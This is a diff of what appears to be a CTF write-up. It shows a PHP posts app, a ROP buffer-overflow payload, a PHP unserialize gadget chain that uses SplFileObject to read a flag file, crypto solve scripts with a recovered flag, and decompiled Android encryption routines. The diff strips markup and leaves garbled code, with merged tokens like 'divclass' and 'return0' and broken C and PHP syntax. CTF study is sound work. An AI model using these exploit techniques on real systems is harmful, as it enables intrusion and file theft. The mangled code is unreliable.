@@ -119,44 +119,44 @@ if($_POST["post"]){
     <link rel="stylesheet" href="bulma.min.css">
 </head>
 
-<body>
+
     <nav class="navbar">
-        <divclass="container">
-        <divclass="navbar-brand">
-                <spanclass="navbar-itemis-white">UserCenter</span>
-            </div>
-        </div>
+        
+        
+                UserCenter
+            
+        
     </nav>
     <sectionclass="section">
-        <divclass="container">
-            <divclass="columnis-8 is-offset-2 ">
-                <divclass="box">
+        
+            
+                
                     <formmethod="POST" action="/?add">
-                        <divclass="field"><inputclass="input" name="post[]"/></div>
-                        <divclass="field"><textareaclass="textarea" name="post[]"/></textarea></div>
-            <divclass="field"><buttonclass="buttonis-link" type="submit">Send</button></div>
+                        
+                        <textareaclass="textarea" name="post[]"/></textarea>
+            Send
                     </form>
             <hr>
             <?phpforeach($postsas $post): ?>
-            <divclass="field">
-                <h3><b><?= $post->title; ?></b></h3>
-                <p><?= $post->content; ?></p>
-            </div>
+            
+                <h3><?= $post->title; ?></h3>
+                <?= $post->content; ?>
+            
             <?phpendforeach; ?>
-                </div>
-                <div>
+                
+                
                     <h5class="has-text-light">buildbygit</h5>
-                    <pclass="is-hidden">
+                    
                     <?phpforeach(scandir(".") as $d): ?>
                     <?= strval($d); ?>
                     <?phpendforeach; ?>
-                    <p>
-                </div>
-            </div>
-        </div>
+                    
+                
+            
+        
     </section>
 
-</body>
+
 
 </html>
 
@@ -355,11 +355,6 @@ payload = b'a'*0x88+p64(pop_rdi) + p64(binsh) + p64(system)
 io.sendline(payload)
 
 io.interactive()
-```
-
-
-
-```
 //posts.php
 <?php
 class Post {
@@ -394,11 +389,6 @@ class Maker {
         $this->obj = null;
     }
 }
-```
-
-
-
-```
 //index.php
 <?php
 include("./posts.php");
@@ -422,51 +412,46 @@ if($_POST["post"]){
     <link rel="stylesheet" href="bulma.min.css">
 </head>
 
-<body>
+
     <nav class="navbar">
-        <divclass="container">
-        <divclass="navbar-brand">
-                <spanclass="navbar-itemis-white">UserCenter</span>
-            </div>
-        </div>
+        
+        
+                UserCenter
+            
+        
     </nav>
     <sectionclass="section">
-        <divclass="container">
-            <divclass="columnis-8 is-offset-2 ">
-                <divclass="box">
+        
+            
+                
                     <formmethod="POST" action="/?add">
-                        <divclass="field"><inputclass="input" name="post[]"/></div>
-                        <divclass="field"><textareaclass="textarea" name="post[]"/></textarea></div>
-            <divclass="field"><buttonclass="buttonis-link" type="submit">Send</button></div>
+                        
+                        <textareaclass="textarea" name="post[]"/></textarea>
+            Send
                     </form>
             <hr>
             <?phpforeach($postsas $post): ?>
-            <divclass="field">
-                <h3><b><?= $post->title; ?></b></h3>
-                <p><?= $post->content; ?></p>
-            </div>
+            
+                <h3><?= $post->title; ?></h3>
+                <?= $post->content; ?>
+            
             <?phpendforeach; ?>
-                </div>
-                <div>
+                
+                
                     <h5class="has-text-light">buildbygit</h5>
-                    <pclass="is-hidden">
+                    
                     <?phpforeach(scandir(".") as $d): ?>
                     <?= strval($d); ?>
                     <?phpendforeach; ?>
-                    <p>
-                </div>
-            </div>
-        </div>
+                    
+                
+            
+        
     </section>
 
-</body>
+
 
 </html>
-```
-
-
-
-```
 <?php
 class Post {
     public $title;
@@ -494,11 +479,6 @@ $a = new Maker('SplFileObject', ['f1a9.php', 'r']);
 $b = (new Post('test'))->setContent($a);
 $c = [$b];
 echo urlencode(serialize($c));
-```
-
-
-
-```
 from hashlib import sha256
 from Crypto.Cipher import AES
 from Crypto.Util.number import long_to_bytes, sieve_base
@@ -546,11 +526,6 @@ cipher = AES.new(key, AES.MODE_ECB)
 flag = cipher.decrypt(C)
 
 print(flag)
-```
-
-
-
-```
 task
 from Crypto.Cipher import AES
 from Crypto.Util.number import *
@@ -594,11 +569,6 @@ print(out)
 print(cipher.encrypt(pad(flag, 16)))
 # 68014145798558789680147296296059748493170180017159509061459191404846898978879
 # b'x9cxafx89x98x90<xdfxe8xefxd7x06x9cxf1xb0x1c3xccx12xabxdcx0exfa/x1bx95xe8xd6xa9axe6x86"x18x86q|xfaxa6xf9xedxe7x80Gx16ax18x04xcb'
-```
-
-
-
-```
 test
 from Crypto.Cipher import AES
 from Crypto.Util.number import *
@@ -648,11 +618,6 @@ print(out)
 print(cipher.encrypt(pad(flag, 16)))
 # 68014145798558789680147296296059748493170180017159509061459191404846898978879
 # b'x9cxafx89x98x90<xdfxe8xefxd7x06x9cxf1xb0x1c3xccx12xabxdcx0exfa/x1bx95xe8xd6xa9axe6x86"x18x86q|xfaxa6xf9xedxe7x80Gx16ax18x04xcb'
-```
-
-
-
-```
 exp
 from Crypto.Util.number import *
 from hashlib import sha512
@@ -692,11 +657,6 @@ for i in range(len(sol)):
     cipher = AES.new(long_to_bytes(k), mode = AES.MODE_ECB)
     print(cipher.decrypt(c))
 # flag{41fe9100-0ac8-4869-9193-69a5a047c060}
-```
-
-
-
-```
 n67175170 = 0x4010302;
   n50594305 = 0x3040201;
   n84017411 = 0x5020103;
@@ -836,14 +796,9 @@ do
 while ( !v24 );
 return result;
 }
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdint.h>
-#include <string.h>
+    #include <stdio.h>
+    #include <stdint.h>
+    #include <string.h>
 
 // 目标32字节常量
 constuint8_t TARGET[32] = {
@@ -1135,13 +1090,8 @@ int main()
 
     return0;
 }
-```
-
-
-
-```
-#include <stdint.h>
-#include <string.h>
+    #include <stdint.h>
+    #include <string.h>
 int main{
 
 char aaaa[]={"abcdefghijklmnopqrstuvwxyabcdef"};
@@ -1166,11 +1116,6 @@ char aaaa[]={"abcdefghijklmnopqrstuvwxyabcdef"};
     printf("n");
     return0；
     }
-```
-
-
-
-```
 __int64 __fastcall Java_com_example_verifyVIN_VinInputActivity_encrypt(__int64 a1, __int64 a2, __int64 a3)
 {
 constchar *s; // r15
@@ -1238,11 +1183,6 @@ if ( (dest[0] & 1) != 0 )
     operator delete(ptr_3);
 return v11;
 }
-```
-
-
-
-```
 unsigned __int8 *__fastcall enhancedEncrypt(unsigned __int8 *a1, __int64 a2, unsigned __int8 *a3)
 {
   __int64 v5; // rdx
@@ -1299,7 +1239,9 @@ while ( (v38 & 1) == 0 || *((_QWORD *)&v38 + 1) <= 0xFFuLL )
       v5 = *((_QWORD *)a3 + 1);
     else
       v6 = a3 + 1;
-    std::string::append(&v38, v6, v5);
+    std::
+string::
+append(&v38, v6, v5);
   }
 strcpy((char *)__AndroidNative2024, ""AndroidNative2024");
   sub_619A0(&v35, __AndroidNative2024, a2);
@@ -1436,11 +1378,6 @@ LABEL_68:
     operator delete(ptr);
 return a1;
 }
-```
-
-
-
-```
 _QWORD *__fastcall sub_619A0(_QWORD *a1, unsigned __int8 *a2, unsigned __int8 *a3)
 {
 unsigned __int8 *v3; // r14
@@ -1515,11 +1452,6 @@ if ( n_1 )
   dest_1[n_1] = 0;
 return a1;
 }
-```
-
-
-
-```
 def decrypt(encrypted_hex, key):
     # 将十六进制密文转换为字节
     encrypted_data = bytes.fromhex(encrypted_hex)
